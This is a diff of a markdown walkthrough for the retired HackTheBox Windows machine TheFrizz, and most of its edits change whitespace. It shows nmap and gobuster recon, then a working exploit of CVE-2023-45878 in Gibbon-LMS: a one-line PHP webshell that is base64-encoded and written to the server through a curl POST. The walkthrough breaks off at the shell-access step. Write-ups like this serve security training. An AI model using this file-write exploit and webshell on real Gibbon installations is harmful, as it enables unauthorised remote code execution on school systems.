@@ -16,34 +16,29 @@ TheFrizz is a retired Windows Server 2022 AD box chaining a Gibbon-LMS arbitrary
 
 ## Recon
 ### Nmap — Port Discovery
-Begin with a full TCP sweep to identify all open ports on the target.
-
+Begin with a full TCP sweep to identify all open ports on the target.  
 `sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
 ![](/assets/img/htb/thefrizz/thefrizz1.png)
 
-Parse the results to store all open ports in a variable for follow-up scanning.
-
+Parse the results to store all open ports in a variable for follow-up scanning.  
 `ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`
 ![](/assets/img/htb/thefrizz/thefrizz5.png)
 
 ---
 
 ### Nmap — Service Enumeration
-Run a targeted service and script scan against only the discovered open ports.
-
+Run a targeted service and script scan against only the discovered open ports.  
 `sudo nmap -p $ports -sC -sV -Pn --min-rate 500 10.129.232.168 -oN scans/service_enum.txt`
 ![](/assets/img/htb/thefrizz/thefrizz2.png)
 
 ---
 
 ### DNS/Host Resolution
-Add `frizz.htb` and `frizzdc.frizz.htb` to `/etc/hosts` to enable proper name resolution.
-
+Add `frizz.htb` and `frizzdc.frizz.htb` to `/etc/hosts` to enable proper name resolution.  
 `echo '10.129.18.74 thefrizz.htb' | sudo tee -a /etc/hosts`
 ![](assets/img/htb/thefrizz/thefrizz3.png)
 `echo '10.129.232.168 frizzdc.frizz.htb' | sudo tee -a /etc/hosts`
 ![](assets/img/htb/thefrizz/thefrizz44.png)
-
 
 ---
 
@@ -63,8 +58,7 @@ Browsing to port 80 presents a public “Walkerville Elementary School” site. 
 
 ### Directory Brute Force
 Ran gobuster against the Gibbon-LMS directory to identify hidden endpoints or misconfigurations.
-No additional interesting directories or files were discovered. Enumeration shifts to application-level vulnerabilities.
-
+No additional interesting directories or files were discovered. Enumeration shifts to application-level vulnerabilities.  
 `gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -w /home/user/tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php`
 ![](assets/img/htb/thefrizz/thefrizz8.png)
 
@@ -73,17 +67,14 @@ No additional interesting directories or files were discovered. Enumeration shif
 ## Initial Access (Web → RCE)
 ### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
 The Gibbon-LMS instance is vulnerable to CVE-2023-45878, allowing arbitrary file write via a base64 image upload endpoint.
-Minimal PHP webshell:
-
+Minimal PHP webshell:  
 `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
 
-The endpoint expects base64-encoded data, so the file is encoded:
-
+The endpoint expects base64-encoded data, so the file is encoded:  
 `b64=$(base64 -w0 shell.php)`
 ![](assets/img/htb/thefrizz/thefrizz12.png)
 
-The vulnerable endpoint allows writing arbitrary content to disk.
-
+The vulnerable endpoint allows writing arbitrary content to disk.  
 `curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
 ![](assets/img/htb/thefrizz/thefrizz14.png)
 
@@ -94,8 +85,7 @@ Parameter breakdown:
     Controls the output filename. No extension restriction allows `.php`.
 * `gibbonPersonID=0000000001`
     Required application field influencing save location.
-Successful upload returns the filename:
-`shell.php%`
+  Successful upload returns the filename:  `shell.php%`
 
 Verify remote code execution
 Access the shell directly:
